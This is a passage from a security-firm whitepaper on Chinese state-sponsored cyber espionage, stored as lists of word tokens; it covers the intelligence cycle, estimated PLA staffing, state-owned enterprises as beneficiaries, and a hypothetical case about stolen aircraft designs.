"at", "risk", ".", "We", "can"], ["also", "assume", "that", "the", "companies", "that", "support", "these", "areas", "\u2013", "lawyers", ",", "sub-contractors", ","], ["outsourced", "suppliers", "and", "any", "government", "departments", "with", "links", "to", "these", "firms", ",", "would", "also"], ["be", "attacked", "as", "part", "of", "an", "effort", "to", "find", "supporting", "information", "."], ["So", "long", "as", "the", "product", "is", "intended", "for", "domestic", "consumption", "only", ",", "in", "many", "cases", "there", "are"], ["minimal", "problems", "for", "the", "company", "targeted", "to", "have", "to", "face", ".", "Many", "firms", "would", "be", "unwilling"], ["or", "unable", "to", "sell", "their", "products", "into", "China", "anyway", "\u2013", "either", "because", "of", "a", "lack", "of", "global"], ["distribution", "networks", ",", "or", "because", "of", "export", "restrictions", ",", "in", "the", "case", "of", "sensitive", "military"], ["technologies", ",", "so", "the", "sale", "of", "an", "identical", ",", "stolen", "product", "would", "not", "directly", "harm", "their"], ["business", "."], ["For", "example", ",", "a", "company", "that", "makes", "hi-tech", "export", "controlled", "widgets", "for", "the", "US", "military", "is"], ["unlikely", "to", "be", "able", "to", "sell", "its", "product", "in", "China", "to", "the", "Chinese", "military", ".", "In", "any", "case", ",", "the"], ["Chinese", "military", "would", "probably", "prefer", "to", "buy", "a", "Chinese", "product", ".", "If", "the", "widget", "designs", "are"], ["stolen", "and", "a", "Chinese", "company", "makes", "the", "exact", "same", "widget", ",", "protected", "by", "a", "Chinese"], ["patent", ",", "the", "end", "product", "could", "be", "sold", "to", "the", "PLA", ".", "While", "the", "original", "manufacturer", "may"], ["rightly", "be", "concerned", "by", "this", ",", "the", "company", "would", "not", "suffer", "financially", ".", "Until", ",", "that", "is", ",", "the"], ["product", "made", "by", "the", "Chinese", "firm", "is", "offered", "for", "sale", "around", "the", "world", "at", "a", "much", "cheaper"], ["Context", "Information", "Security"], ["30", "Marsh", "Wall", ",", "London", ",", "E14", "9TP"], ["+44", "(0)", "207", "537", "7515"], ["www", ".", "contextis.com"], ["12", "/", "33"], ["Whitepaper", "/", "Crouching", "Tiger", ",", "Hidden", "Dragon", ",", "Stolen", "Data"], ["price", "than", "that", "for", "which", "the", "original", "product", "is", "sold", ",", "because", "the", "Chinese", "firm", "has", "not"], ["needed", "to", "fund", "R&D", ".", "At", "this", "point", ",", "buyers", "who", "simply", "want", "a", "widget", "that", "works", "will", "buy", "the"], ["cheaper", "one", "."], ["The", "National", "Outline", "document", "goes", "on", "to", "specify", "\u2018Frontier", "Technologies\u2019:", "areas", "such", "as"], ["biotech", ",", "IT", ",", "advanced", "materials", "and", "manufacturing", "technologies", ",", "energy", "and", "marine"], ["technology", ",", "lasers", "and", "(again)", "aerospace", ",", "all", "areas", "in", "which", "the", "West", "has", "traditionally"], ["excelled", "and", "China", "has", "lagged", "behind", "."], ["The", "other", "key", "area", "that", "could", "lead", "to", "a", "requirement", "for", "cyber", "attacks", "is", "China\u2019s"], ["intelligence-gathering", "operation", ".", "This", "area", "is", "primarily", "controlled", "by", "the", "Party", "rather", "than", "the"], ["intelligence", "services", "themselves", ".", "Requirements", "in", "this", "area", "are", "likely", "to", "incorporate", "generic"], ["tasks", "to", "infiltrate", "and", "disrupt", "the", "activities", "of", "the", "Five", "Poisons", "(see", "above)", ",", "to", "gather", "military"], ["secrets", "from", "overseas", "and", "highlight", "politically", "useful", "information", ".", "That", "could", "be", ",", "for", "example", ","], ["intelligence", "on", "economic", "policies", "of", "the", "Eurozone", "countries", "regarding", "China", ",", "NATO", "plans"], ["for", "Afghanistan", ",", "international", "efforts", "to", "negotiate", "with", "North", "Korea", "or", "reports", "into", "human"], ["rights", "abuses", "."], ["The", "intelligence", "services", "will", "use", "all", "of", "their", "sources", "\u2013", "HUMINT", ",", "SIGINT", "and", "cyber", "\u2013", "to", "address"], ["these", "requirements", ".", "As", "the", "list", "is", "never", "published", "we", "can", "only", "guess", "at", "what", "it", "contains", ",", "but"], ["one", "may", "speculate", "that", "if", "intensive", "investigations", "focused", "on", "the", "detection", "of", "cyber", "attacks"], ["against", "the", "Five", "Poisons", "(the", "GhostNet14", "report", "was", "an", "excellent", "start)", ",", "it", "is", "likely", "that", "the"], ["same", "malware", "and", "infrastructure", "would", "be", "revealed", "to", "have", "been", "deployed", "."], ["http://www", ".", "scribd.com/doc/13731776/Tracking-GhostNet-Investigating-a-CyberEspionage-Network"], ["14"], ["Context", "Information", "Security"], ["30", "Marsh", "Wall", ",", "London", ",", "E14", "9TP"], ["+44", "(0)", "207", "537", "7515"], ["www", ".", "contextis.com"], ["13", "/", "33"], ["Whitepaper", "/", "Crouching", "Tiger", ",", "Hidden", "Dragon", ",", "Stolen", "Data"], ["How", "Does", "it", "Happen", "?"], ["If", "we", "consider", "only", "the", "Chinese", "cyber", "attacks", "that", "have", "been", "reported", "we", "are", "only", "looking"], ["at", "the", "tip", "of", "the", "iceberg", ".", "First", ",", "we", "tend", "only", "to", "see", "reports", "of", "British", "or", "American", "firms", "being"], ["attacked", ",", "and", "we", "know", "that", "only", "a", "tiny", "minority", "of", "incidents", "are", "reported", ",", "because", "firms", "are"], ["either", "unaware", "they", "have", "been", "attacked", "or", "are", "afraid", "that", "publicising", "an", "incident", "will"], ["damage", "their", "brand", ",", "their", "company", "value", "or", "their", "personal", "careers", ".", "It", "is", "also", "likely", "that", "there"], ["is", "a", "huge", "number", "of", "small", "to", "medium", "sized", "enterprises", "around", "the", "world", "that", "have", "no", "idea"], ["that", "their", "crown", "jewels", "have", "been", "stolen", "."], ["Governments", "are", "unlikely", "to", "admit", "having", "lost", "data", "or", "to", "accuse", "China", "directly", ",", "for", "fear", "of"], ["risking", "negative", "political", "and", "economic", "consequences", ".", "Individual", "victims", "living", "in", "China", "will"], ["be", "unable", "to", "complain", "at", "the", "intrusion", "to", "their", "privacy", ",", "while", "those", "outside", "China", "may", "have"], ["little", "recourse", "to", "any", "organisation", "which", "would", "take", "their", "claims", "seriously", "."], ["To", "map", "out", "the", "process", "and", "try", "to", "think", "about", "the", "scale", "of", "the", "attacks", "we", "must", "start", "with", "a"], ["classic", "diagram", "of", "the", "intelligence", "cycle", "."], ["Setting", "Requirements"], ["As", "we", "have", "already", "seen", ",", "China", "has", "no", "issue", "in", "identifying", "requirements", ".", "These", "lie", "across", "the"], ["industrial", ",", "social", "and", "economic", "spectrum", "and", "represent", "the", "results", "of", "a", "mammoth", "effort", "to"], ["identify", "weaknesses", "and", "areas", "for", "further", "development", ".", "Given", "that", "the", "requirements", "are"], ["largely", "focussed", "around", "technical", ",", "economic", "and", "commercial", "development", "rather", "than"], ["social", "development", "it", "is", "fair", "to", "expect", "that", "this", "exercise", "was", "not", "conducted", "by", "government"], ["alone", ",", "but", "must", "have", "been", "supplemented", "by", "private", "sector", "(so", "far", "as", "there", "is", "one)", "."], ["However", ",", "the", "setting", "of", "requirements", "covers", "many", "more", "areas", "than", "just", "cyber", ",", "so", "it", "would"], ["not", "be", "correct", "to", "regard", "this", "effort", "as", "having", "been", "conducted", "simply", "to", "support", "electronic"], ["attacks", "."], ["Context", "Information", "Security"], ["30", "Marsh", "Wall", ",", "London", ",", "E14", "9TP"], ["+44", "(0)", "207", "537", "7515"], ["www", ".", "contextis.com"], ["14", "/", "33"], ["Whitepaper", "/", "Crouching", "Tiger", ",", "Hidden", "Dragon", ",", "Stolen", "Data"], ["Planning", "and", "Direction"], ["This", "is", "where", "things", "get", "a", "little", "bit", "complicated", ".", "Planning", "and", "direction", "activities", "take", "place"], ["on", "multiple", "levels", "\u2013", "at", "a", "Party", "level", ",", "regional", "level", ",", "local", "level", ",", "within", "every", "key", "government"], ["department", ",", "inside", "every", "company", "with", "a", "stake", "in", "fulfilling", "the", "requirements;", "and", "especially"], ["within", "the", "military", ",", "who", "evidence", "suggests", "are", "behind", "the", "bulk", "of", "targeted", "attacks", "."], ["Collection"], ["This", "area", "covers", "the", "whole", "process", "of", "target"], ["identification", ",", "malware", "development", ",", "crafting", "the"], ["attacks", ",", "designing", "the", "social", "engineering", ",", "initiating"], ["attacks", ",", "controlling", "implants", ",", "escalating", "privileges", "on"], ["the", "victim", "network", ",", "uploading", "further", "tools", "to", "maintain"], ["and", "develop", "access", ",", "finding", "and", "exfiltrating", "data", "of"], ["interest", ",", "and", "cleaning", "up", "traces", "of", "the", "attack", "to", "hinder"], ["investigations", "."], ["It", "also", "requires", "infrastructure", "(owned", "or", "stolen)", "to", "be"], ["constructed", "to", "support", "the", "attack", ",", "IP", "addresses", "or"], ["domain", "names", "updated", "into", "the", "implants", ",", "training", "of"], ["operators", ",", "language", "skills", ",", "management", "and", "some"], ["form", "of", "quality", "control", "process", "to", "enable", "some", "visibility"], ["over", "how", "well", "attacks", "are", "progressing", "."], ["While", "much", "of", "the", "attack", "process", "can", "be", "automated"], ["or", "simplified", "so", "it", "can", "be", "delegated", "to", "less", "technically"], ["adept", "operators", ",", "the", "scale", "of", "the", "attack", "is", "such", "that"], ["many", "skilled", "hackers", "will", "be", "needed", "in", "an", "advisory", "capacity", ",", "to", "conduct", "manual", "elements"], ["of", "the", "attack", ",", "to", "maintain", "a", "development", "program", "and", ",", "in", "some", "cases", ",", "to", "share", "details", "of"], ["the", "latest", "attack", "vectors", "and", "vulnerabilities", "with", "those", "tasked", "with", "cyber", "defence", "to", "protect"], ["Chinese", "systems", "from", "similar", "attacks", ".", "There", "will", "also", "almost", "certainly", "be", "an", "administration"], ["process", "that", "logs", "attacks", "and", "targets", ",", "collates", "information", "on", "target", "systems", ",", "feeds", "data", "into"], ["some", "form", "of", "risk", "assessment", "and", "ensures", "that", "all", "ongoing", "attacks", "are", "focussed", "on", "the"], ["attainment", "of", "a", "specific", "requirement", ".", "This", "is", "no", "small", "operation", "."], ["Processing", "and", "Exploitation"], ["If", "1", ",", "000", "attacks", "are", "successful", "and", "all", "result", "in", "large", "amounts", "of", "data", "being", "stolen", "from"], ["compromised", "systems", ",", "that", "data", "needs", "to", "be", "put", "into", "a", "readable", "format", "(and", "decrypted", "if"], ["necessary)", ",", "made", "searchable", ",", "stored", "in", "a", "database", "and", "translated", "into", "Chinese", "\u2013", "and", "all"], ["these", "operations", "have", "to", "be", "carried", "out", "in", "bulk", "and", "in", "real", "time", "or", "something", "close", "to", "it", ",", "to"], ["allow", "that", "information", "to", "be", "used", "as", "quickly", "and", "effectively", "as", "possible", ".", "Of", "course", ",", "the"], ["actual", "number", "of", "active", "compromises", "at", "any", "one", "time", "is", "likely", "to", "be", "many", "magnitudes"], ["higher", "than", "1", ",", "000!"], ["Analysis", "and", "Production"], ["The", "first", "problem", "with", "analysing", "bulk", "amounts", "of", "data", "translated", "from", "other", "languages", "is"], ["that", "machine", "translation", "is", "often", "of", "low", "quality", ",", "particularly", "for", "data", "such", "as", "emails", "written"], ["using", "more", "colloquial", "terms", ".", "The", "second", "issue", "is", "that", "a", "large", "proportion", "of", "the", "stolen"], ["documents", "is", "likely", "to", "be", "of", "a", "highly", "technical", "nature:", "If", "you", "steal", "documents", "from", "a", "widget"], ["maker", "then", "you", "need", "at", "least", "a", "basic", "knowledge", "of", "widgets", "to", "be", "able", "to", "understand", "the"], ["Context", "Information", "Security"], ["30", "Marsh", "Wall", ",", "London", ",", "E14", "9TP"], ["+44", "(0)", "207", "537", "7515"], ["www", ".", "contextis.com"], ["15", "/", "33"], ["Whitepaper", "/", "Crouching", "Tiger", ",", "Hidden", "Dragon", ",", "Stolen", "Data"], ["potential", "value", "of", "a", "document", "and", "how", "best", "to", "exploit", "it", ".", "If", "there", "is", "a", "lot", "of", "widget", "data", "you"], ["will", "need", "a", "lot", "of", "widget", "specialists", "or", "risk", "the", "data", "being", "out", "of", "date", "by", "the", "time", "it", "is"], ["analysed", ".", "And", "just", "because", "someone", "understands", "widgets", "doesn\u2019t", "mean", "that", "they"], ["understand", "gizmos", ",", "so", "another", "team", "will", "be", "required", "to", "look", "at", "that", "data", "\u2013", "and", "so", "on", ".", "These"], ["analysts", "will", "provide", "feedback", "to", "operators", ",", "perhaps", "saying", "\u2018get", "more\u2019", ",", "or", "\u2018this", "is", "no", "good", ","], ["get", "something", "else\u2019", ".", "They", "may", "also", "provide", "search", "terms", "for", "documents", ".", "All", "this", "analysis", "will"], ["then", "need", "to", "be", "written", "up", "into", "reports", "which", "should", "try", "to", "protect", "the", "source", "of", "the"], ["information", "."], ["Dissemination"], ["If", "the", "information", "is", "to", "be", "useful", "the", "reporting", "process", "has", "to", "be", "fast", ",", "in", "order", "to", "get", "useful"], ["information", "to", "the", "right", "people", ".", "Dissemination", "of", "intelligence", "reports", "to", "security", "and"], ["intelligence", "officers", "should", "be", "straightforward", "as", "all", "people", "in", "the", "process", "will", "have"], ["clearances", ".", "But", "we", "can", "assume", "(although", "there", "are", "no", "guarantees)", "that", "this", "information", "is"], ["highly", "classified", "and", "dissemination", "is", "carefully", "controlled", ",", "which", "makes", "disseminating", "it", "to"], ["government", "officials", "a", "little", "more", "difficult", ",", "especially", "if", "those", "officials", "are", "based", "outside"], ["Beijing", ",", "because", "encrypted", "links", "or", "maybe", "a", "network", "of", "trusted", "couriers", "will", "be", "required", "to"], ["transport", "the", "reports", "."], ["The", "most", "difficult", "task", "will", "be", "delivering", "reports", "on", "commercial", "or", "technical", "development", "to"], ["the", "right", "people", ".", "The", "most", "trusted", "individuals", "will", "be", "at", "the", "top", "of", "organisations", ",", "probably", "as"], ["a", "result", "of", "their", "loyalty", "to", "the", "Party", ",", "but", "these", "are", "not", "necessarily", "the", "people", "able", "to"], ["understand", ",", "interpret", "and", "exploit", "the", "information", "contained", "within", "the", "report", ".", "So", "the", "report"], ["or", "elements", "of", "it", "must", "be", "passed", "downwards", "to", "those", "who", "do", "understand", "it", ".", "This", "means", "a"], ["significant", "increase", "in", "the", "number", "of", "people", "who", "are", "aware", ",", "which", "represents", "a", "significant"], ["risk", ".", "The", "Party", "must", "also", "decide", "to", "which", "companies", "it", "will", "pass", "information", "\u2013", "if", "five"], ["companies", "all", "produce", "widgets", "do", "you", "give", "the", "information", "on", "next", "generation", "widgets", "to"], ["one", "of", "them", ",", "or", "all", "of", "them", "?", "We", "will", "look", "at", "one", "way", "the", "Party", "addresses", "this", "issue", "below", "."], ["Getting", "the", "dissemination", "right", "should", "in", "turn", "generate", "more", "requirements", "and", "help", "to"], ["create", "a", "more", "refined", "requirement", "to", "feed", "back", "into", "the", "process", "and", "drive", "the", "next", "data"], ["acquisition", "cycle", "."], ["Context", "Information", "Security"], ["30", "Marsh", "Wall", ",", "London", ",", "E14", "9TP"], ["+44", "(0)", "207", "537", "7515"], ["www", ".", "contextis.com"], ["16", "/", "33"], ["Whitepaper", "/", "Crouching", "Tiger", ",", "Hidden", "Dragon", ",", "Stolen", "Data"], ["The", "Scale", "of", "the", "Operation"], ["Most", "authorities", "attribute", "responsibility", "for", "cyber", "attacks", "and", "intelligence", "gathering", "to", "the"], ["Third", "Department", "of", "the", "PLA", "(3PLA)", "and", "accept", "that", "the", "Second", "Department", "(2PLA)", "may"], ["also", "have", "a", "role", "to", "play", ".", "Accurate", "figures", "for", "the", "size", "of", "these", "Departments", "are", "not", "publicly"], ["available", ",", "but", "the", "more", "success", "the", "attackers", "have", ",", "the", "more", "funding", "they", "are", "likely", "to", "get"], ["for", "further", "attacks", ".", "Other", "branches", "of", "the", "military", "may", "then", "see", "the", "possibility", "for", "increased"], ["funding", "and", "political", "glory", "by", "competing", "in", "the", "same", "space", ".", "One", "very", "thorough", "report", "by"], ["Project", "204915", ",", "a", "group", "who", "analyse", "the", "Asian", "security", "landscape", "among", "other", "topics", ","], ["details", "the", "Third", "Department", "of", "the", "PLA", "and", "outlines", "their", "broader", "activities", "and", "structure", "."], ["Their", "role", "is", "primarily", "SIGINT", "aimed", "at", "intercepting", "radio", ",", "telecoms", "and", "email"], ["communications", "and", "reporting", "the", "content", "as", "intelligence", ".", "The", "report", "contains", "a", "figure"], ["(though", "they", "make", "clear", "this", "is", "estimated)", "of", "130", ",", "000", "people", "being", "part", "of", "the", "3PLA", ".", "The"], ["2PLA", "is", "concerned", "with", "Human", "Intelligence", "(HUMINT)", "as", "well", "as", "SIGINT", "to", "support", "its", "military"], ["intelligence", "mission", "."], ["So", "trying", "to", "work", "out", "how", "many", "people", "are", "involved", "in", "this", "process", "is", "only", "ever", "going", "to", "be"], ["based", "on", "educated", "guesswork", ".", "If", "we", "look", "simply", "at", "the", "effort", "in", "the", "3PLA", ",", "put", "aside", "all", "other"], ["groups", "for", "now", "and", "take", "the", "figure", "of", "130", ",", "000", "as", "true", ",", "there", "is", "a", "very", "large", "pool", "of", "available"], ["personnel", "who", "are", "able", "to", "support", "cyber", "operations", ".", "However", ",", "as", "we", "have", "stated", "above", ","], ["the", "3PLA", "has", "a", "remit", "broader", "than", "simply", "cyber", "and", "other", "areas", "are", "far", "more", "established", "."], ["Numbers", "working", "in", "the", "requirements", "capture", "and", "planning", "area", "are", "probably", "in", "the", "low"], ["hundreds", ".", "Trying", "to", "gauge", "the", "size", "of", "the", "collection", "effort", "is", "difficult", "and", "requires", "a", "large"], ["margin", "of", "error", ".", "But", "it", "is", "fair", "to", "assume", "that", "several", "hundred", "people", "could", "do", "the", "target"], ["development", "work;", "around", "a", "hundred", "dedicated", "specialists", "could", "work", "on", "malware"], ["development", "(with", "the", "Chinese", "hacking", "community", "providing", "new", "tools", "at", "regular"], ["intervals);", "perhaps", "one", "or", "two", "thousand", "low", "level", "operators", "(the", "\u2018B\u2019", "team)", "supported", "by"], ["another", "few", "hundred", "with", "more", "advanced", "skills", "(the", "\u2018A\u2019", "team)", "who", "look", "after", "the", "most"], ["sensitive", "intrusions;", "an", "infrastructure", "team", "of", "a", "few", "dozen;", "and", "an", "operational", "security", "team"], ["of", "a", "few", "dozen", "more", "."], ["Then", "come", "the", "processing", "and", "analysis", "experts:", "potentially", "a", "pool", "of", "several", "thousand"], ["specialists", "able", "to", "read", "and", "write", "in", "a", "wide", "variety", "of", "languages;", "hundreds", "if", "not", "thousands"], ["of", "specialists", "in", "all", "of", "the", "fields", "of", "information", "being", "stolen", "\u2013", "politics", ",", "economics", ",", "engineering", ","], ["IT", ",", "science", ",", "etc;", "hundreds", "of", "report", "writers;", "dozens", "of", "people", "processing", "data;", "and", "dozens"], ["more", "administering", "the", "whole", "process", "."], ["If", "these", "very", "rough", "figures", "are", "anywhere", "close", "to", "reality", ",", "at", "least", "7", ",", "000", "people", "are", "directly"], ["involved", "in", "hacking", "foreign", "computer", "networks", "for", "the", "Chinese", "military", "and", "processing", "the"], ["output", "of", "those", "attacks", ".", "Potentially", "many", "thousands", "more", "see", "the", "reporting", "and", "are", "aware"], ["of", "the", "sorts", "of", "results", "generated", "by", "these", "operations", "."], ["15http://project2049", ".", "net/documents/pla_third_department_sigint_cyber_stokes_lin_hsiao.pdf"], ["Context", "Information", "Security"], ["30", "Marsh", "Wall", ",", "London", ",", "E14", "9TP"], ["+44", "(0)", "207", "537", "7515"], ["www", ".", "contextis.com"], ["17", "/", "33"], ["Whitepaper", "/", "Crouching", "Tiger", ",", "Hidden", "Dragon", ",", "Stolen", "Data"], ["Profiting", "from", "the", "Product"], ["So", "who", "is", "most", "likely", "to", "profit", "from", "the", "information", "being", "gathered", "through", "these", "attacks", "?"], ["The", "political", ",", "economic", "and", "intelligence", "reporting", "has", "a", "clear", "audience", ",", "but", "deciding", "who"], ["the", "commercial", "intelligence", "should", "be", "passed", "to", "presents", "a", "more", "taxing", "problem", ".", "Which"], ["companies", "receive", "this", "kind", "of", "assistance", "?", "The", "answer", "may", "lie", "in", "the", "particular", "brand", "of"], ["capitalism", "which", "China"], ["practices", "."], ["China", "is", "no", "longer", "the"], ["planned", "economy", "it", "once"], ["was", "and", "some", "Chinese"], ["companies", "are", "now", "among"], ["the", "largest", "in", "the", "world", ".", "But"], ["this", "is", "not", "capitalism", "as", "we"], ["know", "it", "and", "these", "companies"], ["are", "far", "from", "being", "truly"], ["\u2018private\u2019", ".", "All", "the", "largest"], ["companies", "in", "China", "are", "State"], ["Owned", "Enterprises", "(SOEs)", "in"], ["which", "the", "state", "is", "the", "largest"], ["(or", "only)", "shareholder", ".", "The"], ["state", "can", "and", "does", "change", "company", "board", "members", "at", "will", "and", "members", "of", "the", "armed"], ["forces", "are", "routinely", "brought", "into", "senior", "management", "roles", ".", "But", "in", "addition", "to", "simply"], ["appointing", "the", "heads", "of", "companies", ",", "the", "Party", "also", "has", "a", "final", "say", "over", "the", "strategic"], ["direction", "of", "each", "company", ",", "business", "planning", "processes", "and", "the", "size", "of", "salaries", "paid", "to"], ["employees", ".", "After", "all", ",", "if", "companies", "are", "seen", "to", "be", "profiting", "unfairly", "at", "the", "expense", "of", "the"], ["workers", "that", "could", "lead", "to", "political", "unrest", "."], ["There", "are", "currently", "117", "companies", "classed", "as", "SOEs", "and", "under", "the", "control", "of", "the", "Stateowned", "Assets", "Supervision", "and", "Administration", "Commission", "(SASAC)", ",", "the", "primary", "shareholder"], ["in", "these", "companies", ".", "To", "give", "some", "idea", "of", "the", "scale", "of", "SOEs", ",", "they", "now", "comprise", "80%", "of", "the"], ["value", "of", "China\u2019s", "stock", "market", ".", "Yet", "in", "the", "last", "10", "years", ",", "the", "number", "of", "SOEs", "has", "almost", "halved"], ["as", "SASAC", "has", "pushed", "through", "mergers", "of", "companies", "with", "similar", "strengths", "to", "consolidate"], ["the", "overall", "power", "of", "these", "companies", "in", "various", "sectors", "and", "make", "them", "more", "competitive"], ["outside", "China", ".", "SASAC", "works", "alongside", "the", "Communist", "Party\u2019s", "Organisation", "Department", ","], ["which", "acts", "as", "a", "human", "resources", "department", "and", "makes", "certain", "that", "those", "running", "these"], ["businesses", "care", "every", "bit", "as", "much", "(if", "not", "more)", "about", "pleasing", "Party", "bosses", "as", "they", "do"], ["about", "their", "success", "in", "business", "."], ["In", "addition", "to", "the", "Party\u2019s", "input", "to", "the", "strategies", "pursued", "by", "these", "companies", ",", "the", "state", "is", "also"], ["instrumental", "in", "guiding", "them", "to", "financial", "success", "by", "other", "means", ".", "Most", "significantly", "it"], ["arranges", "cheap", "lines", "of", "credit", ",", "allowing", "companies", "to", "borrow", "money", "for", "expansion;", "and"], ["provides", "a", "ready-made", "market", "for", "the", "company", "\u2013", "the", "Party", "has", "the", "ability", "to", "block"], ["competitors", "from", "any", "industry", "or", "to", "introduce", "policies", "which", "make", "competitors", "more"], ["expensive", ".", "The", "state", "can", "also", "provide", "considerable", "human", "resources", "if", "a", "particular"], ["company", "or", "industry", "needs", "to", "increase", "production", "suddenly:", "large", "pools", "of", "labour", "in", "China"], ["work", "for", "the", "state", "rather", "than", "companies", "and", "so", "form", "a", "mobile", "and", "flexible", "workforce", ".", "But", "if"], ["at", "the", "end", "of", "the", "day", "the", "products", "or", "services", "a", "company", "offers", "are", "outdated", "or", "of", "poor"], ["quality", ",", "that", "company", "will", "fail", ".", "The", "Party", "has", "a", "vested", "interest", "in", "every", "SOE", "performing", "well"], ["Context", "Information", "Security"], ["30", "Marsh", "Wall", ",", "London", ",", "E14", "9TP"], ["+44", "(0)", "207", "537", "7515"], ["www", ".", "contextis.com"], ["18", "/", "33"], ["Whitepaper", "/", "Crouching", "Tiger", ",", "Hidden", "Dragon", ",", "Stolen", "Data"], ["and", "becoming", "a", "national", "or", "global", "champion", "in", "its", "sector", ",", "so", "it", "may", "be", "willing", "to", "extend"], ["help", "through", "the", "leveraging", "of", "intelligence", "sources", ".", "Note", "the", "list", "of", "companies", "and", "sectors"], ["in", "Appendix", "A:", "it", "is", "clear", "that", "the", "companies", "on", "the", "list", "all", "have", "interests", "in", "areas", "which", "will"], ["support", "the", "Five", "Year", "Plan", "and", "Indigenous", "Innovation", "."], ["Hypothetical", "Case", "Study:", "Aircraft", "Construction"], ["One", "good", "example", "of", "how", "the", "Party", "could", "use", "its", "intelligence", "collection", "methods", "to", "benefit"], ["an", "SOE", "is", "seen", "in", "the", "case", "of", "COMAC16", ",", "the", "Commercial", "Aircraft", "Corporation", "of", "China", "."], ["COMAC", "is", "currently", "trying", "to", "build", "a", "large", "aircraft", "to", "compete", "with", "the", "likes", "of", "Boeing", "and"], ["Airbus", ".", "In", "an", "excellent", "in-depth", "paper", "on", "Indigenous", "Innovation17", ",", "the", "US", "Chamber", "of"], ["Commerce", "and", "strategic", "consulting", "firm", "ACPO", "Worldwide18", "detail", "the", "desire", "of", "China", "to"], ["build", "an", "aircraft", "since", "the", "crash", "(and", "subsequent", "re-engineering)", "of", "a", "Pakistan", "Airlines"], ["Boeing", "707", "in", "1971", ".", "The", "re-engineered", "plane", "named", "the", "Yun-10", "was", "a", "complete", "failure", "as"], ["China", "did", "not", "at", "that", "time", "possess", "all", "the", "necessary", "technology", "required", "to", "make", "it", "a"], ["success", "."], ["With", "a", "rise", "in", "the", "use", "of", "air", "transport", "within", "China", ",", "domestic", "carriers", "are", "being", "forced", "to", "buy"], ["foreign", "aircraft", "at", "enormous", "cost", ",", "whereas", "a", "home-grown", "aircraft", "could", "be", "sold", "much", "more"], ["cheaply", ".", "The", "COMAC", "C91919", "is", "designed", "to", "rival", "the", "Boeing", "737", "and", "Airbus", "A320", "and"], ["planned", "to", "be", "operating", "by", "2015", ",", "and", "to", "encourage", "foreign", "companies", "to", "share", "their"], ["technology", ",", "China", "has", "promised", "access", "to", "the", "market", ".", "Companies", "including", "Parker"], ["Aerospace", ",", "General", "Electric", ",", "Honeywell", "and", "Goodrich", "have", "all", "signed", "up", ".", "Whether", "they"], ["benefit", "from", "this", "move", "in", "the", "long", "term", ",", "or", "are", "instead", "encouraged", "to", "leave", "once", "they", "have"], ["been", "bled", "dry", "of", "useful", "information", ",", "remains", "to", "be", "seen", ".", "But", "for", "all", "the", "help", "they", "are", "getting", ","], ["Chinese", "engineers", "are", "not", "yet", "able", "to", "access", "the", "technology", "developed", "by", "Boeing", "and"], ["Airbus", ",", "or", "by", "large", "aeroplane", "engine", "suppliers", "such", "as", "Rolls", "Royce", "."], ["We", "know", "therefore", "that", "there", "is", "intent", "to", "build", "a", "domestic", "airliner", "and", "that", "previously", "reengineering", "has", "been", "attempted", ".", "Technology", "transfer", "is", "ongoing", "at", "the", "moment", ",", "but", "how"], ["(hypothetically)", "could", "computer", "network", "exploitation", "attacks", "help", "China", "achieve", "its", "goal", "?"], ["It", "is", "hard", "to", "imagine", "that", "a", "project", "of", "that", "size", "would", "not", "be", "given", "some", "assistance", "by", "the"], ["government", ",", "given", "that", "there", "is", "national", "pride", "at", "stake", ".", "If", "intelligence", "or", "military", "resources"], ["could", "be", "directed", "against", "Boeing", "and", "Airbus", "networks", "there", "would", "be", "some", "very", "quick", "wins", "."], ["Not", "only", "could", "design", "documents", "and", "technical", "information", "be", "stolen", "en", "masse", "and"], ["without", "the", "need", "to", "actually", "deal", "with", "the", "company", ",", "but", "there", "could", "be", "some", "weak", "links", "in"], ["the", "supply", "chains", "of", "these", "companies", "which", "would", "help", "an", "attacker", "to", "penetrate", "their"], ["networks", "."], ["First", ",", "smaller", "suppliers", "would", "provide", "an", "easy", "target", "from", "where", "attacks", "could", "be", "launched"], ["directly", ",", "spoofing", "emails", "with", "Trojans", "to", "improve", "the", "chance", "of", "recipients", "opening", "them", "."], ["Second", ",", "both", "companies", "have", "facilities", "in", "China", ",", "presumably", "with", "network", "connectivity"], ["which", "may", "provide", "a", "direct", "route", "into", "the", "main", "network", ".", "There", "are", "also", "Chinese", "citizens"], ["working", "for", "the", "two", "target", "organisations", "who", "could", "be", "tasked", "to", "download", "something"], ["nefarious", "or", "plug", "in", "a", "USB", "drive", "to", "help", "their", "country", "."], ["http://english", ".", "comac.cc/"], ["http://www", ".", "uschamber.com/sites/default/files/reports/100728chinareport_0.pdf"], ["18", "http://www", ".", "apcoworldwide.com/"], ["19", "http://en", ".", "wikipedia.org/wiki/Comac_C919"], ["16"], ["17"], ["Context", "Information", "Security"], ["30", "Marsh", "Wall", ",", "London", ",", "E14", "9TP"], ["+44", "(0)", "207", "537", "7515"], ["www", ".", "contextis.com"], ["19", "/", "33"], ["Whitepaper", "/", "Crouching", "Tiger", ",", "Hidden", "Dragon", ",", "Stolen", "Data"], ["Finally", "all", "large", "organisations", "share", "large", "amounts", "of", "their", "data", "with", "third", "parties", "such", "as", "law"], ["firms", "and", "consultants;", "companies", "that", "may", "not", "protect", "their", "networks", "as", "effectively", "as", "the"], ["target", "company", ".", "These", "\u2018data", "aggregators\u2019", "can", "present", "a", "major", "vulnerability", "in", "the", "security"], ["of", "sensitive", "data", "."], ["The", "end", "goal", "of", "the", "project", "is", "to", "sell", "the", "aircraft", "worldwide", "and", "to", "undercut", "the", "established"], ["suppliers", ".", "COMAC", "could", "achieve", "this", "by", "using", "lines", "of", "credit", "at", "favourable", "rates", "from", "the"], ["Chinese", "banks", "that", "would", "help", "to", "make", "deals", "cheaper", "for", "airlines", "purchasing", "aircraft", ".", "But"], ["what", "really", "helps", "these", "companies", "undercut", "foreign", "rivals", "is", "that", "they", "have", "not", "needed", "to"], ["spend", "huge", "amounts", "of", "money", "on", "R&D", "to", "get", "the", "plane", "off", "the", "ground", "in", "the", "first", "place", "."], ["If", "designs", "for", "the", "body", "of", "the", "aircraft", "could", "be", "stolen", "along", "with", "aerodynamic", "information", "it"], ["would", "cut", "development", "time", "by", "years;", "and", "by", "billions", "of", "dollars", ".", "If", "stolen", "engine", "designs"], ["were", "also", "used", "that", "would", "cut", "costs", "further", "still", ".", "Even", "if", "the", "companies", "from", "whom", "this"], ["technology", "had", "been", "stolen", "were", "able", "to", "see", "that", "it", "had", "been", "stolen", ",", "they", "would", "only", "be"], ["able", "to", "take", "limited", "action", "in", "response;", "and", "to", "do", "so", "could", "put", "at", "risk", "their", "continued", "ability"], ["to", "operate", "or", "sell", "in", "China", "."], ["The", "list", "of", "SOEs", 